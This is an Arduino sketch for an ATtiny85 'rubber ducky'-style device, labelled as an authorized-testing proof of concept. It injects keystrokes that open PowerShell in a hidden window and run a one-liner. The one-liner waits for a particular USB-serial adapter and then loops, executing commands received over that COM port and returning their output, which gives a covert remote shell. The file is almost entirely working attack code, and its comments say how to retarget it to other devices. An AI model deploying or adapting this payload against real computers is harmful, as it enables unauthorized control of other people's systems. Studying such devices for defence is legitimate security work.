#include "DigiKeyboard.h"
/*
Proof of concept (HID keystroke injection) for AUTHORIZED testing only.

What it does:
- Opens the Windows "Run" dialog (Win + R)
- Launches PowerShell
- Executes a payload that waits for a specific USB-serial adapter and redirects PowerShell I/O to the corresponding COM port

NOTE:
This PoC was tested with an ATtiny85 and an ESP8266 board using a USB-to-serial adapter
(Device ID: "USB\VID_1A86&PID_7523\6&1C4D2F9B&0&21") enumerated by Windows as a COM device.
Since the ATtiny85 has ~512 bytes of RAM available, the payload is kept as short as possible and
matches only the most stable substring of the PnP Device ID, "1A86&PID_7523" (Vendor ID + Product ID),
then opens the serial port at 115200 baud.

If you want to test this PoC with a different device, update the Vendor ID/Product ID substring and any related parameters.
If your device does not enumerate as a COM port, you may need to adjust the detection and port-selection logic.
*/

const char* cmd = "powershell -nop -w h -c \"for(;;){try{for(;!`$p){`$p=gwmi Win32_PnPEntity|?{`$_.PnpDeviceID-match'1A86&PID_7523'}|%{`$_.Name-match'COM\\d+'>`$a;`$matches[0]};if(!`$p){sleep 1}}`$s=[IO.Ports.SerialPort]::new(`$p,115200);`$s.ReadTimeout=9999;`$s.Open();for(){try{`$s.Write((iex('try{'+`$s.ReadLine()+'}catch{};echo .;')*>&1|out-string)+'>')}catch{throw}}}catch{`$s|% Close;`$p=`$null;sleep 1}}\"";
void setup() {
  DigiKeyboard.delay(5000);                        // Wait 5 seconds. Increase the delay on slower systems.
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win + R to open "run" dialog
  DigiKeyboard.delay(2000);                        // Wait 2 seconds for the "run" window to appear
  DigiKeyboard.print("powershell");                // Type "Powershell" and press ENTER to launch Powershell
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);                        // Wait 5 seconds for the Powershell window to appear and be ready
  DigiKeyboard.print(cmd);                         // Type the actual Payload and press ENTER to execute
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
	}

void loop() {}